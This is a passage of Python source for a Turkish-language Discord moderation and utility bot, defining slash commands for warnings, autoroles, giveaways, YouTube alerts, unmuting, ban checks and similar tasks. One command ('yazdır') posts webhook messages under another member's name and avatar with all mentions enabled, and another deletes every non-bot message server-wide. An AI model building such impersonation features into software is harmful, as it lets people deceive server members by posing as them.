@bot.tree.command(name="uyarı-listesi", description="Kullanıcının uyarılarını gösterir")
@has_command_permission('warn')
async def warn_list_tr(interaction: discord.Interaction, kullanıcı: discord.Member):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    guild_id = str(interaction.guild.id)
    user_id = str(kullanıcı.id)
    
    if (guild_id not in bot.warnings_data or 
        user_id not in bot.warnings_data[guild_id] or 
        not bot.warnings_data[guild_id][user_id]):
        sent_message = await interaction.response.send_message(
            get_text(guild_id, "warn_none"),
            ephemeral=True
        )
        await sent_message.edit(view=TranslateView("No warnings"))
        return
    
    uyarılar = bot.warnings_data[guild_id][user_id]
    view = WarnListView(kullanıcı.id, uyarılar)
    embed = view.create_embed(guild_id)
    
    sent_message = await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
    await sent_message.edit(view=TranslateView(f"Warning list for {kullanıcı.mention}: {len(uyarılar)} warnings"))

@bot.tree.command(name="youtube-video-kanal-kurulum", description="YouTube video bildirimlerini kurar (sadece sunucu sahibi)")
@is_server_owner()
async def yt_video_channel_setup_tr(
    interaction: discord.Interaction, 
    youtube_api_anahtari: str,
    youtube_kanal_id: str,
    kanal: Optional[discord.TextChannel] = None
):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    hedef_kanal = kanal or interaction.channel
    guild_id = str(interaction.guild.id)
    
    sent_message = await interaction.response.send_message(
        "Yeni videolar için mesaj şablonunu girin ({link} video linki için):",
        ephemeral=True
    )
    await sent_message.edit(view=TranslateView("Enter message template for new videos (use {link} for video link):"))
    
    def check(m):
        return m.author == interaction.user and m.channel == interaction.channel
    
    try:
        msg = await bot.wait_for('message', check=check, timeout=60)
        mesaj_şablonu = msg.content
        
        try:
            await msg.delete()
        except:
            pass
        
    except asyncio.TimeoutError:
        await interaction.followup.send("Zaman aşımı.", ephemeral=True)
        return
    
    test_video = await bot.get_latest_youtube_video(youtube_api_anahtari, youtube_kanal_id)
    if not test_video:
        sent_message = await interaction.followup.send("❌ Geçersiz YouTube API anahtarı veya kanal ID!", ephemeral=True)
        await sent_message.edit(view=TranslateView("Invalid YouTube API key or channel ID!"))
        return
    
    bot.yt_settings[guild_id] = {
        'api_key': youtube_api_anahtari,
        'channel_id': youtube_kanal_id,
        'discord_channel_id': hedef_kanal.id,
        'message_template': mesaj_şablonu,
        'last_video_id': test_video['id']
    }
    
    bot.save_json(bot.yt_settings, "yt_settings.json")
    
    sent_message = await interaction.followup.send(
        get_text(guild_id, "yt_setup_complete"),
        ephemeral=True
    )
    await sent_message.edit(view=TranslateView("YouTube video channel setup completed!"))

@bot.tree.command(name="youtube-video-kanal-sıfırla", description="YouTube video bildirimlerini sıfırlar (sadece sunucu sahibi)")
@is_server_owner()
async def yt_video_channel_reset_tr(interaction: discord.Interaction):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    guild_id = str(interaction.guild.id)
    
    if guild_id in bot.yt_settings:
        del bot.yt_settings[guild_id]
        bot.save_json(bot.yt_settings, "yt_settings.json")
    
    sent_message = await interaction.response.send_message(
        get_text(guild_id, "yt_reset_complete"),
        ephemeral=True
    )
    await sent_message.edit(view=TranslateView("YouTube video channel reset!"))

@bot.tree.command(name="yt-api-anahtarı-al", description="YouTube API anahtarı alma rehberi")
async def get_yt_api_key_tr(interaction: discord.Interaction):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    view = GetYouTubeAPIView()
    sent_message = await interaction.response.send_message(
        "**YouTube API Anahtarı Rehberi**\nDilinizi seçin:",
        view=view,
        ephemeral=True
    )
    await sent_message.edit(view=TranslateView("YouTube API Key Guide - Select your language"))

@bot.tree.command(name="çekiliş-katılma-limit", description="Çekiliş katılma limitlerini ayarlar")
@has_command_permission('giveaway')
async def giveaway_join_limit_tr(interaction: discord.Interaction):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    view = GiveawayJoinLimitView(bot, str(interaction.guild.id))
    sent_message = await interaction.response.send_message(
        "🎯 **Çekiliş Katılma Limitleri**\nKatılma limitleri için roller seçin:",
        view=view,
        ephemeral=True
    )
    await sent_message.edit(view=TranslateView("Giveaway Join Limits - Select roles to set join limits"))

@bot.tree.command(name="çekiliş-katılma-limit-id", description="ID ile çekiliş katılma limiti ayarlar")
@has_command_permission('giveaway')
async def giveaway_join_limit_id_tr(interaction: discord.Interaction, hedef_id: str, katılma_limit: int):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    guild_id = str(interaction.guild.id)
    
    if guild_id not in bot.giveaway_join_limits:
        bot.giveaway_join_limits[guild_id] = {}
    
    bot.giveaway_join_limits[guild_id][hedef_id] = katılma_limit
    bot.save_json(bot.giveaway_join_limits, "giveaway_join_limits.json")
    
    hedef = interaction.guild.get_role(int(hedef_id)) or interaction.guild.get_member(int(hedef_id))
    hedef_ismi = hedef.mention if hedef else f"ID: {hedef_id}"
    
    limit_metin = "sınırsız" if katılma_limit == 0 else f"{katılma_limit} giriş"
    
    sent_message = await interaction.response.send_message(
        f"✅ {hedef_ismi} için {limit_metin} ayarlandı",
        ephemeral=True
    )
    await sent_message.edit(view=TranslateView(f"Set {limit_metin} for {hedef_ismi}"))

@bot.tree.command(name="çekiliş-katılma-limit-sıfırla", description="Tüm çekiliş katılma limitlerini sıfırlar")
@has_command_permission('giveaway')
async def giveaway_join_limit_reset_tr(interaction: discord.Interaction):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    guild_id = str(interaction.guild.id)
    
    if guild_id in bot.giveaway_join_limits:
        del bot.giveaway_join_limits[guild_id]
        bot.save_json(bot.giveaway_join_limits, "giveaway_join_limits.json")
    
    sent_message = await interaction.response.send_message("✅ Çekiliş katılma limitleri sıfırlandı!", ephemeral=True)
    await sent_message.edit(view=TranslateView("Giveaway join limits reset!"))

@bot.tree.command(name="otorol", description="Oto-rol ekler/kaldırır")
@is_server_owner()
async def autorole_tr(interaction: discord.Interaction, işlem: str, rol: discord.Role):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    guild_id = str(interaction.guild.id)
    
    if guild_id not in bot.autorole_data:
        bot.autorole_data[guild_id] = []
    
    if işlem.lower() == "ekle":
        if rol.id in bot.autorole_data[guild_id]:
            sent_message = await interaction.response.send_message("❌ Rol zaten oto-rolde!", ephemeral=True)
            await sent_message.edit(view=TranslateView("Role is already in autorole!"))
            return
        
        bot.autorole_data[guild_id].append(rol.id)
        sent_message = await interaction.response.send_message(
            get_text(guild_id, "autorole_added", role=rol.mention),
            ephemeral=True
        )
        await sent_message.edit(view=TranslateView(f"Added to autorole: {rol.mention}"))
    
    elif işlem.lower() == "kaldır":
        if rol.id not in bot.autorole_data[guild_id]:
            sent_message = await interaction.response.send_message("❌ Rol oto-rolde değil!", ephemeral=True)
            await sent_message.edit(view=TranslateView("Role is not in autorole!"))
            return
        
        bot.autorole_data[guild_id].remove(rol.id)
        sent_message = await interaction.response.send_message(
            get_text(guild_id, "autorole_removed", role=rol.mention),
            ephemeral=True
        )
        await sent_message.edit(view=TranslateView(f"Removed from autorole: {rol.mention}"))
    
    else:
        sent_message = await interaction.response.send_message("❌ Geçersiz işlem! 'ekle' veya 'kaldır' kullanın.", ephemeral=True)
        await sent_message.edit(view=TranslateView("Invalid action! Use 'add' or 'remove'."))
        return
    
    bot.save_json(bot.autorole_data, "autorole.json")

@bot.tree.command(name="otorol-id", description="ID ile oto-rol ekler/kaldırır")
@is_server_owner()
async def autorole_id_tr(interaction: discord.Interaction, işlem: str, rol_id: str):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    guild_id = str(interaction.guild.id)
    rol = interaction.guild.get_role(int(rol_id))
    
    if not rol:
        sent_message = await interaction.response.send_message("❌ Rol bulunamadı!", ephemeral=True)
        await sent_message.edit(view=TranslateView("Role not found!"))
        return
    
    if guild_id not in bot.autorole_data:
        bot.autorole_data[guild_id] = []
    
    if işlem.lower() == "ekle":
        if rol.id in bot.autorole_data[guild_id]:
            sent_message = await interaction.response.send_message("❌ Rol zaten oto-rolde!", ephemeral=True)
            await sent_message.edit(view=TranslateView("Role is already in autorole!"))
            return
        
        bot.autorole_data[guild_id].append(rol.id)
        sent_message = await interaction.response.send_message(
            get_text(guild_id, "autorole_added", role=rol.mention),
            ephemeral=True
        )
        await sent_message.edit(view=TranslateView(f"Added to autorole: {rol.mention}"))
    
    elif işlem.lower() == "kaldır":
        if rol.id not in bot.autorole_data[guild_id]:
            sent_message = await interaction.response.send_message("❌ Rol oto-rolde değil!", ephemeral=True)
            await sent_message.edit(view=TranslateView("Role is not in autorole!"))
            return
        
        bot.autorole_data[guild_id].remove(rol.id)
        sent_message = await interaction.response.send_message(
            get_text(guild_id, "autorole_removed", role=rol.mention),
            ephemeral=True
        )
        await sent_message.edit(view=TranslateView(f"Removed from autorole: {rol.mention}"))
    
    else:
        sent_message = await interaction.response.send_message("❌ Geçersiz işlem! 'ekle' veya 'kaldır' kullanın.", ephemeral=True)
        await sent_message.edit(view=TranslateView("Invalid action! Use 'add' or 'remove'."))
        return
    
    bot.save_json(bot.autorole_data, "autorole.json")

@bot.tree.command(name="otorol-listesi", description="Oto-rol listesini gösterir")
async def autorole_list_tr(interaction: discord.Interaction):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    guild_id = str(interaction.guild.id)
    
    if guild_id not in bot.autorole_data or not bot.autorole_data[guild_id]:
        sent_message = await interaction.response.send_message(
            get_text(guild_id, "autorole_list") + ": Rol yok",
            ephemeral=True
        )
        await sent_message.edit(view=TranslateView("Autorole List: No roles"))
        return
    
    embed = discord.Embed(
        title=get_text(guild_id, "autorole_list"),
        color=get_rainbow_color()
    )
    
    rol_mentions = []
    for rol_id in bot.autorole_data[guild_id]:
        rol = interaction.guild.get_role(rol_id)
        if rol:
            rol_mentions.append(rol.mention)
    
    embed.description = "\n".join(rol_mentions)
    
    sent_message = await interaction.response.send_message(embed=embed, ephemeral=True)
    await sent_message.edit(view=TranslateView(f"Autorole List: {len(rol_mentions)} roles"))

@bot.tree.command(name="rol-veri-kaydet", description="Belirli sunucu için rol verilerini kaydeder (sadece bot sahibi)")
@is_bot_owner()
async def save_role_data_tr(interaction: discord.Interaction, sunucu_id: str):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    if sunucu_id not in bot.save_role_data:
        bot.save_role_data[sunucu_id] = True
    else:
        bot.save_role_data[sunucu_id] = not bot.save_role_data[sunucu_id]
    
    bot.save_json(bot.save_role_data, "save_role_data.json")
    
    durum = "aktif" if bot.save_role_data[sunucu_id] else "devre dışı"
    sent_message = await interaction.response.send_message(
        f"✅ {sunucu_id} sunucusu için rol veri kaydetme {durum}",
        ephemeral=True
    )
    await sent_message.edit(view=TranslateView(f"Role data saving {durum} for server {sunucu_id}"))

@bot.tree.command(name="yetkili-başvuru-kurulum", description="Başvuru sistemini kurar (sadece sunucu sahibi)")
@is_server_owner()
async def authorized_application_setup_tr(interaction: discord.Interaction, kanal: Optional[discord.TextChannel] = None):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    hedef_kanal = kanal or interaction.channel
    
    sent_message = await interaction.response.send_message(get_text(str(interaction.guild.id), "application_enter_stages"), ephemeral=True)
    await sent_message.edit(view=TranslateView("Please enter the number of stages:"))
    
    def check(m):
        return m.author == interaction.user and m.channel == interaction.channel and m.content.isdigit()
    
    try:
        msg = await bot.wait_for('message', check=check, timeout=60)
        aşama_sayısı = int(msg.content)
    except asyncio.TimeoutError:
        await interaction.followup.send("Zaman aşımı.", ephemeral=True)
        return
    
    aşamalar = []
    for i in range(aşama_sayısı):
        sent_message = await interaction.followup.send(get_text(str(interaction.guild.id), "application_enter_stage", number=i+1), ephemeral=True)
        await sent_message.edit(view=TranslateView(f"Please enter stage {i+1}:"))
        
        def stage_check(m):
            return m.author == interaction.user and m.channel == interaction.channel
        
        try:
            msg = await bot.wait_for('message', check=stage_check, timeout=60)
            aşamalar.append(msg.content)
        except asyncio.TimeoutError:
            await interaction.followup.send("Zaman aşımı.", ephemeral=True)
            return
    
    view = ApplicationOptionalView(bot, str(interaction.guild.id), aşamalar)
    sent_message = await interaction.followup.send(get_text(str(interaction.guild.id), "application_select_optional"), view=view, ephemeral=True)
    await sent_message.edit(view=TranslateView("Select optional stages (if any):"))
    
    await view.wait()
    opsiyonel_aşamalar = getattr(view, 'optional_stages', [])
    
    başvuru_id = f"{interaction.guild.id}_{int(datetime.datetime.now().timestamp())}"
    
    bot.application_data[başvuru_id] = {
        "guild_id": interaction.guild.id,
        "channel_id": hedef_kanal.id,
        "stages": aşamalar,
        "optional_stages": opsiyonel_aşamalar,
        "created_by": interaction.user.id,
        "created_at": datetime.datetime.now().isoformat()
    }
    bot.save_json(bot.application_data, "application_data.json")
    
    embed = discord.Embed(
        title="📝 Başvuru Sistemi",
        description="Başvurunuzu başlatmak için aşağıdaki butona tıklayın!",
        color=get_rainbow_color()
    )
    
    view = ApplicationStartView(bot, str(interaction.guild.id), başvuru_id)
    sent_message = await hedef_kanal.send(embed=embed, view=view)
    await sent_message.edit(view=TranslateView("Application System - Click the button below to start your application!"))
    
    sent_message = await interaction.followup.send(get_text(str(interaction.guild.id), "application_setup_complete"), ephemeral=True)
    await sent_message.edit(view=TranslateView("Application system setup completed!"))

@bot.tree.command(name="kanalları-sıfırla", description="Tüm kanallardaki mesajları siler (Sampy Bot mesajları hariç)")
@has_command_permission('reset-channels-message')
async def reset_channels_message_tr(interaction: discord.Interaction):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    await interaction.response.defer(ephemeral=True)
    
    try:
        silinen_sayı = 0
        
        for kanal in interaction.guild.channels:
            if isinstance(kanal, discord.TextChannel):
                try:
                    async for mesaj in kanal.history(limit=None):
                        if mesaj.author != bot.user:
                            await mesaj.delete()
                            silinen_sayı += 1
                except Exception as e:
                    print(f"{kanal.name} kanalında mesajlar silinemedi: {e}")
        
        sent_message = await interaction.followup.send(f"✅ Tüm kanallardan {silinen_sayı} mesaj başarıyla silindi!", ephemeral=True)
        await sent_message.edit(view=TranslateView(f"Successfully deleted {silinen_sayı} messages from all channels!"))
        
    except Exception as e:
        sent_message = await interaction.followup.send(f"❌ Hata: {str(e)}", ephemeral=True)
        await sent_message.edit(view=TranslateView(f"Error: {str(e)}"))

@bot.tree.command(name="susturmayı-kaldır", description="Kullanıcının susturmasını kaldırır")
@has_command_permission('unmute')
async def unmute_tr(interaction: discord.Interaction, kullanıcı: discord.Member, sebep: Optional[str] = "Sebep belirtilmedi"):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    try:
        for kanal in interaction.guild.channels:
            if isinstance(kanal, discord.TextChannel):
                await kanal.set_permissions(kullanıcı, overwrite=None)
        
        sent_message = await interaction.response.send_message(
            get_text(str(interaction.guild.id), "unmuted", user=kullanıcı.mention)
        )
        await sent_message.edit(view=TranslateView(f"Unmuted {kullanıcı.mention}"))
        
        await send_mod_log(
            interaction.guild, 
            "Susturma Kaldırma", 
            kullanıcı, 
            interaction.user, 
            reason=sebep
        )
    except Exception as e:
        sent_message = await interaction.response.send_message(f"❌ Susturma kaldırma başarısız: {str(e)}", ephemeral=True)
        await sent_message.edit(view=TranslateView(f"Unmute failed: {str(e)}"))

@bot.tree.command(name="timeout-kaldır", description="Kullanıcının timeout'unu kaldırır")
@has_command_permission('untimeout')
async def untimeout_tr(interaction: discord.Interaction, kullanıcı: discord.Member, sebep: Optional[str] = "Sebep belirtilmedi"):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    try:
        if kullanıcı.timed_out_until is None:
            sent_message = await interaction.response.send_message(
                get_text(str(interaction.guild.id), "user_not_timed_out"),
                ephemeral=True
            )
            await sent_message.edit(view=TranslateView("User is not timed out!"))
            return
        
        await kullanıcı.timeout(None, reason=sebep)
        sent_message = await interaction.response.send_message(
            get_text(str(interaction.guild.id), "untimeout", user=kullanıcı.mention)
        )
        await sent_message.edit(view=TranslateView(f"Timeout removed from {kullanıcı.mention}"))
        
        await send_mod_log(
            interaction.guild, 
            "Timeout Kaldırma", 
            kullanıcı, 
            interaction.user, 
            reason=sebep
        )
    except Exception as e:
        sent_message = await interaction.response.send_message(f"❌ Timeout kaldırma başarısız: {str(e)}", ephemeral=True)
        await sent_message.edit(view=TranslateView(f"Untimeout failed: {str(e)}"))

@bot.tree.command(name="geçmiş", description="Kullanıcının ceza geçmişini gösterir")
@has_command_permission('history')
async def history_tr(interaction: discord.Interaction, kullanıcı: discord.Member, miktar: Optional[str] = None):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    user_id = str(kullanıcı.id)
    
    if user_id not in bot.punishment_users:
        sent_message = await interaction.response.send_message("❌ Bu kullanıcının ceza geçmişi yok!", ephemeral=True)
        await sent_message.edit(view=TranslateView("No punishment history for this user!"))
        return
    
    cezalar = bot.punishment_users[user_id]
    
    if miktar and miktar.lower() == "tümü":
        gösterilecek_cezalar = list(cezalar.items())
    else:
        try:
            göster_sayısı = int(miktar) if miktar else 10
            gösterilecek_cezalar = list(cezalar.items())[:göster_sayısı]
        except ValueError:
            sent_message = await interaction.response.send_message("❌ Geçersiz miktar! Sayı veya 'tümü' kullanın.", ephemeral=True)
            await sent_message.edit(view=TranslateView("Invalid amount! Use a number or 'all'."))
            return
    
    embed = discord.Embed(
        title=f"📋 Ceza Geçmişi - {kullanıcı.display_name}",
        color=get_rainbow_color()
    )
    
    for ceza_id, ceza_verisi in gösterilecek_cezalar:
        embed.add_field(
            name=f"{ceza_verisi['type']} - {ceza_id}",
            value=f"Sebep: {ceza_verisi['reason']}\nSüre: {ceza_verisi['duration']}\nZaman: {ceza_verisi['timestamp'][:16]}",
            inline=False
        )
    
    sent_message = await interaction.response.send_message(embed=embed, ephemeral=True)
    await sent_message.edit(view=TranslateView(f"Punishment history for {kullanıcı.display_name}: {len(gösterilecek_cezalar)} entries"))

@bot.tree.command(name="ip-ban-kaldır", description="Kullanıcının IP banını kaldırır")
@has_command_permission('unipban')
async def unipban_tr(interaction: discord.Interaction, kullanıcı_id: str, sebep: Optional[str] = "Sebep belirtilmedi"):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    try:
        user = await bot.fetch_user(int(kullanıcı_id))
        await interaction.guild.unban(user, reason=sebep)
        
        if kullanıcı_id in bot.punishment_users:
            for ceza_id, ceza_verisi in list(bot.punishment_users[kullanıcı_id].items()):
                if ceza_verisi['type'] == 'ban' and ceza_verisi['guild_id'] == interaction.guild.id:
                    del bot.punishment_users[kullanıcı_id][ceza_id]
                    if not bot.punishment_users[kullanıcı_id]:
                        del bot.punishment_users[kullanıcı_id]
                    bot.save_json(bot.punishment_users, bot.punishment_users_file)
                    break
        
        sent_message = await interaction.response.send_message(
            get_text(str(interaction.guild.id), "unipbanned", user=user.mention)
        )
        await sent_message.edit(view=TranslateView(f"IP ban removed from {user.mention}"))
        
        await send_mod_log(
            interaction.guild, 
            "IP Ban Kaldırma", 
            user, 
            interaction.user, 
            reason=sebep
        )
    except Exception as e:
        sent_message = await interaction.response.send_message(f"❌ IP ban kaldırma başarısız: {str(e)}", ephemeral=True)
        await sent_message.edit(view=TranslateView(f"Un-IP ban failed: {str(e)}"))

@bot.tree.command(name="ip-susturma-kaldır", description="Kullanıcının IP susturmasını kaldırır")
@has_command_permission('unipmute')
async def unipmute_tr(interaction: discord.Interaction, kullanıcı_id: str, sebep: Optional[str] = "Sebep belirtilmedi"):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    try:
        user = await bot.fetch_user(int(kullanıcı_id))
        
        for kanal in interaction.guild.channels:
            if isinstance(kanal, (discord.TextChannel, discord.VoiceChannel)):
                await kanal.set_permissions(user, overwrite=None)
        
        if kullanıcı_id in bot.punishment_users:
            for ceza_id, ceza_verisi in list(bot.punishment_users[kullanıcı_id].items()):
                if ceza_verisi['type'] == 'mute' and ceza_verisi['guild_id'] == interaction.guild.id:
                    del bot.punishment_users[kullanıcı_id][ceza_id]
                    if not bot.punishment_users[kullanıcı_id]:
                        del bot.punishment_users[kullanıcı_id]
                    bot.save_json(bot.punishment_users, bot.punishment_users_file)
                    break
        
        sent_message = await interaction.response.send_message(
            get_text(str(interaction.guild.id), "unipmuted", user=user.mention)
        )
        await sent_message.edit(view=TranslateView(f"IP mute removed from {user.mention}"))
        
        await send_mod_log(
            interaction.guild, 
            "IP Susturma Kaldırma", 
            user, 
            interaction.user, 
            reason=sebep
        )
    except Exception as e:
        sent_message = await interaction.response.send_message(f"❌ IP susturma kaldırma başarısız: {str(e)}", ephemeral=True)
        await sent_message.edit(view=TranslateView(f"Un-IP mute failed: {str(e)}"))

@bot.tree.command(name="ban-kontrol", description="Kullanıcının banlı olup olmadığını kontrol eder")
@has_command_permission('checkban')
async def checkban_tr(interaction: discord.Interaction, kullanıcı_id: str):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    try:
        ban_listesi = await interaction.guild.bans()
        kullanıcı_id_int = int(kullanıcı_id)
        
        for ban_girişi in ban_listesi:
            if ban_girişi.user.id == kullanıcı_id_int:
                embed = discord.Embed(
                    title="🔨 Kullanıcı Banlı",
                    description=f"<@{kullanıcı_id}> kullanıcısı bu sunucudan banlanmış.",
                    color=get_rainbow_color()
                )
                embed.add_field(name="Sebep", value=ban_girişi.reason or "Sebep belirtilmedi")
                sent_message = await interaction.response.send_message(embed=embed)
                await sent_message.edit(view=TranslateView(f"User <@{kullanıcı_id}> is banned. Reason: {ban_girişi.reason or 'No reason provided'}"))
                return
        
        sent_message = await interaction.response.send_message(
            get_text(str(interaction.guild.id), "user_not_banned"),
            ephemeral=True
        )
        await sent_message.edit(view=TranslateView("User is not banned!"))
    except Exception as e:
        sent_message = await interaction.response.send_message(f"❌ Ban kontrolü başarısız: {str(e)}", ephemeral=True)
        await sent_message.edit(view=TranslateView(f"Check ban failed: {str(e)}"))

@bot.tree.command(name="susturma-kontrol", description="Kullanıcının susturulmuş olup olmadığını kontrol eder")
@has_command_permission('checkmute')
async def checkmute_tr(interaction: discord.Interaction, kullanıcı: discord.Member):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    susturulan_kanallar = []
    
    for kanal in interaction.guild.channels:
        if isinstance(kanal, discord.TextChannel):
            overwrite = kanal.overwrites_for(kullanıcı)
            if overwrite.send_messages == False:
                susturulan_kanallar.append(kanal.mention)
    
    if susturulan_kanallar:
        embed = discord.Embed(
            title="🔇 Kullanıcı Susturulmuş",
            description=f"{kullanıcı.mention} aşağıdaki kanallarda susturulmuş:",
            color=get_rainbow_color()
        )
        embed.add_field(name="Susturulan Kanallar", value="\n".join(susturulan_kanallar[:10]))
        if len(susturulan_kanallar) > 10:
            embed.add_field(name="Not", value=f"Ve {len(susturulan_kanallar) - 10} kanal daha...")
        sent_message = await interaction.response.send_message(embed=embed)
        await sent_message.edit(view=TranslateView(f"{kullanıcı.mention} is muted in {len(susturulan_kanallar)} channels"))
    else:
        sent_message = await interaction.response.send_message(
            get_text(str(interaction.guild.id), "user_not_muted"),
            ephemeral=True
        )
        await sent_message.edit(view=TranslateView("User is not muted!"))

@bot.tree.command(name="cezalı-kullanıcılar", description="Sunucudaki tüm cezalı kullanıcıları gösterir")
@has_command_permission('punishment-users')
async def punishment_users_tr(interaction: discord.Interaction):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    guild_id = interaction.guild.id
    cezalı_kullanıcılar = []
    
    for kullanıcı_id, cezalar in bot.punishment_users.items():
        for ceza_id, ceza_verisi in cezalar.items():
            if ceza_verisi['guild_id'] == guild_id:
                cezalı_kullanıcılar.append((kullanıcı_id, ceza_verisi))
                break
    
    if not cezalı_kullanıcılar:
        sent_message = await interaction.response.send_message(
            get_text(str(guild_id), "no_punishments")
        )
        await sent_message.edit(view=TranslateView("No active punishments!"))
        return
    
    embed = discord.Embed(
        title=get_text(str(guild_id), "punishment_users"),
        color=get_rainbow_color()
    )
    
    for kullanıcı_id, ceza_verisi in cezalı_kullanıcılar[:15]:
        try:
            user = await bot.fetch_user(int(kullanıcı_id))
            kullanıcı_görünüm = f"{user.display_name} ({user.id})"
        except:
            kullanıcı_görünüm = f"Bilinmeyen Kullanıcı ({kullanıcı_id})"
        
        embed.add_field(
            name=kullanıcı_görünüm,
            value=get_text(
                str(guild_id), 
                "punishment_entry",
                user=kullanıcı_görünüm,
                type=ceza_verisi['type'],
                duration=ceza_verisi['duration'],
                reason=ceza_verisi['reason']
            ),
            inline=False
        )
    
    if len(cezalı_kullanıcılar) > 15:
        embed.set_footer(text=f"Ve {len(cezalı_kullanıcılar) - 15} kullanıcı daha...")
    
    sent_message = await interaction.response.send_message(embed=embed)
    await sent_message.edit(view=TranslateView(f"Punishment Users: {len(cezalı_kullanıcılar)} users with active punishments"))

@bot.tree.command(name="yazdır", description="Başka bir kullanıcı adına mesaj gönderir (sunucu yönetme izni gerektirir)")
@has_manage_guild_permission()
async def write_for_tr(interaction: discord.Interaction, kullanıcı: discord.Member, mesaj: str, kanal: Optional[discord.TextChannel] = None):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    hedef_kanal = kanal or interaction.channel

    webhooks = await hedef_kanal.webhooks()
    webhook = None
    for wh in webhooks:
        if wh.user == bot.user:
            webhook = wh
            break

    if not webhook:
        webhook = await hedef_kanal.create_webhook(name="Sampy Bot Webhook")

    await webhook.send(
        content=mesaj,
        username=kullanıcı.display_name,
        avatar_url=kullanıcı.display_avatar.url,
        allowed_mentions=discord.AllowedMentions.all()
    )

    sent_message = await interaction.response.send_message(f"✅ Mesaj {hedef_kanal.mention} kanalında {kullanıcı.mention} olarak gönderildi", ephemeral=True)
    await sent_message.edit(view=TranslateView(f"Message sent in {hedef_kanal.mention} as {kullanıcı.mention}"))

@bot.tree.command(name="komut-izin-kurulum-1", description="Komut izinlerini ayarlar bölüm 1 (sadece sunucu sahibi)")
@is_server_owner()
async def command_permission_setup_1_tr(interaction: discord.Interaction):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    view = CommandPermissionView1(bot, str(interaction.guild.id))
    sent_message = await interaction.response.send_message(
        "🛠️ **Komut İzin Ayarları (Bölüm 1)**\nYapılandırmak istediğiniz komutu seçin:",
        view=view,
        ephemeral=True
    )
    await sent_message.edit(view=TranslateView("Command Permission Settings (Part 1) - Select the command you want to configure:"))

@bot.tree.command(name="komut-izin-kurulum-2", description="Komut izinlerini ayarlar bölüm 2 (sadece sunucu sahibi)")
@is_server_owner()
async def command_permission_setup_2_tr(interaction: discord.Interaction):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    view = CommandPermissionView2(bot, str(interaction.guild.id))
    sent_message = await interaction.response.send_message(
        "🛠️ **Komut İzin Ayarları (Bölüm 2)**\nYapılandırmak istediğiniz komutu seçin:",
        view=view,
        ephemeral=True
    )
    await sent_message.edit(view=TranslateView("Command Permission Settings (Part 2) - Select the command you want to configure:"))

@bot.tree.command(name="sayı-tahmin-oyunu", description="Sayı tahmin oyunu oynar")
async def number_game_tr(
    interaction: discord.Interaction, 
    işlem: str,
    kullanıcı: discord.Member,
    sampy_coin_miktarı: Optional[int] = None,
    sayı: Optional[int] = None
):
    if not is_verified(interaction.user, interaction.guild):
        await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
        return
    
    if işlem == "gönder":
        if sampy_coin_miktarı is None or sayı is None:
            sent_message = await interaction.response.send_message("❌ Gönderme işlemi için miktar ve sayı gereklidir!", ephemeral=True)
            await sent_message.edit(view=TranslateView("Amount and number required for send action!"))
            return
        
        if sampy_coin_miktarı <= 0:
            sent_message = await interaction.response.send_message("❌ Geçersiz miktar!", ephemeral=True)
            await sent_message.edit(view=TranslateView("Invalid amount!"))
            return
        
        if sayı < 1 or sayı > 10:
            sent_message = await interaction.response.send_message("❌ Sayı 1-10 arasında olmalıdır!", ephemeral=True)
